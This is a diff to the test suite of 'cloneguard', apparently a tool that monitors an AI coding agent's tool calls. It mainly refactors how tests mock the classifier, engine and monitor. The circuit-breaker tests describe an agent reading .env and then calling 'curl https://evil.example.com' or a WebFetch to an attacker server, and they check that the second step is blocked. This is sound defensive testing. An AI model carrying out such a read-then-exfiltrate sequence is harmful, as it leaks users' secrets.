@@ -732,7 +732,6 @@ class TestModeThreadingHooks:
         """handle_instructions_loaded must call classify() with mode=ScanMode.STRICT (minimum)."""
         from unittest.mock import MagicMock, patch
 
-        from cloneguard.detection.engine import get_detection_engine
         from cloneguard.patterns import ScanMode
 
         mock_classifier = MagicMock()
@@ -756,15 +755,10 @@ class TestModeThreadingHooks:
         # Path README.md -> STANDARD from _detect_mode, but hook_default=STRICT wins
         mock_engine = self._make_engine_mock(ScanMode.STANDARD)
 
-        engine = get_detection_engine()
-        with (
-            patch.object(engine, "_pattern_engine", mock_engine),
-            patch.object(engine, "_mini_classifier", mock_classifier),
-            patch.object(engine, "_mini_attempted", True),
-        ):
-            engine._session_trust.clear()
-            _session_trust.clear()
-            handle_instructions_loaded(data)
+        with patch("cloneguard.hooks._get_mini_classifier", return_value=mock_classifier):
+            with patch("cloneguard.hooks._get_engine", return_value=mock_engine):
+                _session_trust.clear()
+                handle_instructions_loaded(data)
 
         # classify() must be called with mode=ScanMode.STRICT (minimum for InstructionsLoaded)
         assert mock_classifier.classify.called
@@ -775,7 +769,6 @@ class TestModeThreadingHooks:
         """handle_post_tool_use must call classify() with mode derived from source_path."""
         from unittest.mock import MagicMock, patch
 
-        from cloneguard.detection.engine import get_detection_engine
         from cloneguard.patterns import ScanMode
 
         mock_classifier = MagicMock()
@@ -794,13 +787,9 @@ class TestModeThreadingHooks:
 
         mock_engine = self._make_engine_mock(ScanMode.STRICT)
 
-        engine = get_detection_engine()
-        with (
-            patch.object(engine, "_pattern_engine", mock_engine),
-            patch.object(engine, "_mini_classifier", mock_classifier),
-            patch.object(engine, "_mini_attempted", True),
-        ):
-            handle_post_tool_use(data)
+        with patch("cloneguard.hooks._get_mini_classifier", return_value=mock_classifier):
+            with patch("cloneguard.hooks._get_engine", return_value=mock_engine):
+                handle_post_tool_use(data)
 
         assert mock_classifier.classify.called
         call_kwargs = mock_classifier.classify.call_args
@@ -810,7 +799,6 @@ class TestModeThreadingHooks:
         """handle_post_tool_use uses STANDARD mode for README.md source path."""
         from unittest.mock import MagicMock, patch
 
-        from cloneguard.detection.engine import get_detection_engine
         from cloneguard.patterns import ScanMode
 
         mock_classifier = MagicMock()
@@ -829,13 +817,9 @@ class TestModeThreadingHooks:
         # README.md -> _detect_mode returns STANDARD
         mock_engine = self._make_engine_mock(ScanMode.STANDARD)
 
-        engine = get_detection_engine()
-        with (
-            patch.object(engine, "_pattern_engine", mock_engine),
-            patch.object(engine, "_mini_classifier", mock_classifier),
-            patch.object(engine, "_mini_attempted", True),
-        ):
-            handle_post_tool_use(data)
+        with patch("cloneguard.hooks._get_mini_classifier", return_value=mock_classifier):
+            with patch("cloneguard.hooks._get_engine", return_value=mock_engine):
+                handle_post_tool_use(data)
 
         assert mock_classifier.classify.called
         call_kwargs = mock_classifier.classify.call_args
@@ -845,7 +829,6 @@ class TestModeThreadingHooks:
         """handle_post_tool_use uses LENIENT mode for test fixture paths."""
         from unittest.mock import MagicMock, patch
 
-        from cloneguard.detection.engine import get_detection_engine
         from cloneguard.patterns import ScanMode
 
         mock_classifier = MagicMock()
@@ -864,13 +847,9 @@ class TestModeThreadingHooks:
         # tests/ path -> _detect_mode returns LENIENT
         mock_engine = self._make_engine_mock(ScanMode.LENIENT)
 
-        engine = get_detection_engine()
-        with (
-            patch.object(engine, "_pattern_engine", mock_engine),
-            patch.object(engine, "_mini_classifier", mock_classifier),
-            patch.object(engine, "_mini_attempted", True),
-        ):
-            handle_post_tool_use(data)
+        with patch("cloneguard.hooks._get_mini_classifier", return_value=mock_classifier):
+            with patch("cloneguard.hooks._get_engine", return_value=mock_engine):
+                handle_post_tool_use(data)
 
         assert mock_classifier.classify.called
         call_kwargs = mock_classifier.classify.call_args
@@ -880,7 +859,6 @@ class TestModeThreadingHooks:
         """handle_pre_tool_use uses STRICT mode when writing to CLAUDE.md (sensitive target)."""
         from unittest.mock import MagicMock, patch
 
-        from cloneguard.detection.engine import get_detection_engine
         from cloneguard.patterns import ScanMode
 
         mock_classifier = MagicMock()
@@ -901,13 +879,9 @@ class TestModeThreadingHooks:
         # CLAUDE.md -> _detect_mode returns STRICT
         mock_engine = self._make_engine_mock(ScanMode.STRICT)
 
-        engine = get_detection_engine()
-        with (
-            patch.object(engine, "_pattern_engine", mock_engine),
-            patch.object(engine, "_mini_classifier", mock_classifier),
-            patch.object(engine, "_mini_attempted", True),
-        ):
-            handle_pre_tool_use(data)
+        with patch("cloneguard.hooks._get_mini_classifier", return_value=mock_classifier):
+            with patch("cloneguard.hooks._get_engine", return_value=mock_engine):
+                handle_pre_tool_use(data)
 
         assert mock_classifier.classify.called
         call_kwargs = mock_classifier.classify.call_args
@@ -1112,7 +1086,7 @@ class TestMonitorIntegration:
 
         mock_monitor = MagicMock()
         mock_monitor.check_enforcement.return_value = None
-        monkeypatch.setattr("cloneguard.detection.sequence.get_monitor", lambda: mock_monitor)
+        monkeypatch.setattr("cloneguard.hooks.get_monitor", lambda: mock_monitor)
         data = {
             "hook_type": "PreToolUse",
             "session_id": "test-session",
@@ -1128,7 +1102,7 @@ class TestMonitorIntegration:
         from unittest.mock import MagicMock
 
         mock_monitor = MagicMock()
-        monkeypatch.setattr("cloneguard.detection.sequence.get_monitor", lambda: mock_monitor)
+        monkeypatch.setattr("cloneguard.hooks.get_monitor", lambda: mock_monitor)
         data = {
             "hook_type": "PostToolUse",
             "session_id": "test-session",
@@ -1146,7 +1120,7 @@ class TestMonitorIntegration:
 
         mock_monitor = MagicMock()
         mock_monitor.check_enforcement.side_effect = RuntimeError("monitor crashed")
-        monkeypatch.setattr("cloneguard.detection.sequence.get_monitor", lambda: mock_monitor)
+        monkeypatch.setattr("cloneguard.hooks.get_monitor", lambda: mock_monitor)
         data = {
             "hook_type": "PreToolUse",
             "session_id": "test-session",
@@ -1183,14 +1157,18 @@ class TestCircuitBreakerProof:
         Step 2: Agent attempts curl https://evil.example.com (PreToolUse fires)
         Result: Exit code 2 — curl never executes. Secret never leaves.
         """
-        from unittest.mock import patch as mock_patch
-
         from cloneguard.hooks import handle_post_tool_use, handle_pre_tool_use
         from cloneguard.monitor import ToolCallMonitor
 
         mon = ToolCallMonitor(log_dir=tmp_path)
 
-        with mock_patch("cloneguard.detection.sequence.get_monitor", return_value=mon):
+        # Patch get_monitor to use our test instance
+        import cloneguard.hooks as hooks_mod
+
+        original_get_monitor = hooks_mod.get_monitor
+        hooks_mod.get_monitor = lambda: mon
+
+        try:
             session = "circuit-breaker-proof"
 
             # Step 1: Agent reads .env — PostToolUse records the sensitive read marker
@@ -1224,21 +1202,26 @@ class TestCircuitBreakerProof:
             )
             assert "SEQ-002" in output
             assert "BLOCKED" in output
-        mon.close()
+        finally:
+            hooks_mod.get_monitor = original_get_monitor
+            mon.close()
 
     def test_env_read_then_webfetch_is_blocked_before_execution(self, tmp_path):
         """Kill chain: Read .env → WebFetch to attacker server.
 
         Same proof as above but via WebFetch instead of curl.
         """
-        from unittest.mock import patch as mock_patch
-
         from cloneguard.hooks import handle_post_tool_use, handle_pre_tool_use
         from cloneguard.monitor import ToolCallMonitor
 
         mon = ToolCallMonitor(log_dir=tmp_path)
 
-        with mock_patch("cloneguard.detection.sequence.get_monitor", return_value=mon):
+        import cloneguard.hooks as hooks_mod
+
+        original_get_monitor = hooks_mod.get_monitor
+        hooks_mod.get_monitor = lambda: mon
+
+        try:
             session = "circuit-breaker-proof-wf"
 
             # Step 1: Agent reads .env
@@ -1269,7 +1252,9 @@ class TestCircuitBreakerProof:
             )
             assert "SEQ-001" in output
             assert "BLOCKED" in output
-        mon.close()
+        finally:
+            hooks_mod.get_monitor = original_get_monitor
+            mon.close()
 
     def test_benign_read_then_fetch_is_allowed(self, tmp_path):
         """Reading a non-sensitive file then fetching a URL is not blocked.
@@ -1277,14 +1262,17 @@ class TestCircuitBreakerProof:
         Proves the circuit breaker is precise — it only trips on the
         sensitive-read → exfil sequence, not on normal development workflows.
         """
-        from unittest.mock import patch as mock_patch
-
         from cloneguard.hooks import handle_post_tool_use, handle_pre_tool_use
         from cloneguard.monitor import ToolCallMonitor
 
         mon = ToolCallMonitor(log_dir=tmp_path)
 
-        with mock_patch("cloneguard.detection.sequence.get_monitor", return_value=mon):
+        import cloneguard.hooks as hooks_mod
+
+        original_get_monitor = hooks_mod.get_monitor
+        hooks_mod.get_monitor = lambda: mon
+
+        try:
             session = "circuit-breaker-benign"
 
             # Step 1: Agent reads a normal source file
@@ -1313,4 +1301,6 @@ class TestCircuitBreakerProof:
                 f"Expected exit code 0 (allowed), got {pre_exit}. "
                 "False positive: benign fetch was incorrectly blocked."
             )
-        mon.close()
+        finally:
+            hooks_mod.get_monitor = original_get_monitor
+            mon.close()
